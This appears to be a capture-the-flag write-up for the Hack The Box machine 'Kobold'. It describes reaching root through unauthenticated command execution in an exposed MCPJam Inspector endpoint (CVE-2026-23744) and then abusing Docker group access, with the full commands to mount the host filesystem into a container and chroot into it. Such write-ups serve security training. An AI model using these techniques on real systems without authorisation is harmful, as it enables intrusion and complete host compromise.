Kobold

HTBEasyRCEEnumerationMisconfiguration

Kobold is an easy Linux machine where subdomain enumeration reveals an exposed MCPJam Inspector instance vulnerable to unauthenticated remote code execution. Exploiting CVE-2026-23744 provides a shell as ben, while a hidden Docker group membership allows Docker commands to be executed and the host filesystem to be mounted into a privileged container, resulting in root access.

Solved: August 15, 2026

Recon

Started with a basic Nmap scan:

nmap
$ nmap -sCV -Pn 10.129.18.222

The scan identified three accessible services:

PortServiceVersion
22SSHOpenSSH 9.6p1 Ubuntu 3ubuntu13.15
80HTTPnginx 1.24.0 (Ubuntu)
443HTTPSnginx 1.24.0 (Ubuntu)

The HTTPS certificate revealed the hostname:

Subject: commonName=kobold.htb Subject Alternative Name: DNS:kobold.htb DNS:*.kobold.htb

We added the hostname to /etc/hosts:

10.129.18.222 kobold.htb

The wildcard certificate was particularly interesting because it suggested that additional subdomains could exist.

Enumeration

HTTP - TCP 80/443

Port 80 redirected to HTTPS:

https://kobold.htb/

The main website did not expose an obvious attack path, so we moved on to virtual host enumeration.

Subdomain Enumeration

We fuzzed for subdomains under kobold.htb.

The scan revealed two interesting hosts:

mcp.kobold.htb bin.kobold.htb

We added both to /etc/hosts:

10.129.18.222 mcp.kobold.htb 10.129.18.222 bin.kobold.htb

The two subdomains exposed different applications.

bin.kobold.htb hosted PrivateBin, while mcp.kobold.htb hosted an MCPJam Inspector instance.

The MCP service was the more interesting target because it exposed an API capable of starting MCP server processes.

MCPJam Inspector

Navigating to:

https://mcp.kobold.htb/

revealed an MCPJam Inspector interface.

Further enumeration identified the MCPJam Inspector version as:

MCPJam Inspector v1.4.2

Research into this version revealed CVE-2026-23744, an unauthenticated remote code execution vulnerability in MCPJam Inspector.

The vulnerable endpoint was:

/api/mcp/connect

The endpoint accepts a serverConfig object containing a command and arguments. Because the application does not properly authenticate or restrict these values, an attacker can cause the server to execute arbitrary commands.

Initial Access

We exploited the MCPJam Inspector vulnerability to execute commands on the target.

The vulnerable endpoint was:

https://mcp.kobold.htb/api/mcp/connect

The request supplies a command through serverConfig.command and arguments through serverConfig.args.

After confirming command execution, we used the vulnerability to obtain a reverse shell.

The resulting shell was running as:

ben

We verified the current user:

whoami
$ whoami
ben

The shell was initially somewhat limited, so we upgraded it to a more usable interactive shell.

We then retrieved the user flag:

cat
$ cat /home/ben/user.txt
e54763a76169233143ae9819aa97051e

At this point, we had obtained user-level access.

Privilege Escalation

After obtaining a shell as ben, we began enumerating local privileges.

One interesting service was Docker.

Initially, attempting to interact with the Docker daemon failed:

docker
$ docker ps
permission denied while trying to connect to the Docker daemon socket

This suggested that ben did not appear to have normal Docker group access.

However, further enumeration revealed that Docker group access could be activated through the user's existing group configuration.

We switched into the Docker group:

newgrp
$ newgrp docker

After doing so, Docker commands worked:

docker
$ docker ps

The Docker daemon returned the currently running container:

CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 4c49dd7bb727 privatebin/nginx-fpm-alpine:2.0.2 "/etc/init.d/rc.local" ... Up ... 127.0.0.1:8080->8080/tcp bin

This was a critical finding because membership in the docker group effectively provides control over the Docker daemon.

Docker can be abused to create a privileged container and mount directories from the host filesystem.

Root

We created a container using the existing PrivateBin image and mounted the host filesystem into /mnt:

docker
$ docker run --rm -it -u 0 --entrypoint sh -v /:/mnt privatebin/nginx-fpm-alpine:2.0.2

The container started with UID 0:

/var/www #

Inside the container, the host filesystem was available at:

/mnt

We then changed the root directory to the mounted host filesystem:

chroot
$ chroot /mnt sh

Checking our privileges:

id
$ id

returned:

uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)

We were now operating as root on the host filesystem.

Finally, we retrieved the root flag:

cat
$ cat /root/root.txt
edd3eed2588cc6eecb8a2cda5dbfe6ab

The machine was fully compromised.

Key Takeaways

  • Pay attention to TLS certificates. The wildcard certificate for *.kobold.htb was a strong indication that additional virtual hosts were worth enumerating.
  • Enumerate subdomains thoroughly. mcp.kobold.htb exposed the MCPJam Inspector service that provided the initial attack path.
  • Identify versions of exposed applications. MCPJam Inspector v1.4.2 was vulnerable to CVE-2026-23744.
  • Look for unauthenticated APIs. The /api/mcp/connect endpoint allowed arbitrary commands to be supplied to the MCP server process.
  • Enumerate local privileges after getting a shell. Docker access was not immediately obvious because docker ps initially returned a permission error.
  • Check group configuration carefully. newgrp docker activated Docker access for ben, providing control over the Docker daemon.
  • Docker group membership is effectively root-equivalent. A user capable of controlling the Docker daemon can create containers with host filesystem mounts.
  • Host filesystem mounts can lead directly to root. Mounting / into a privileged container and using chroot provided direct root access to the host.
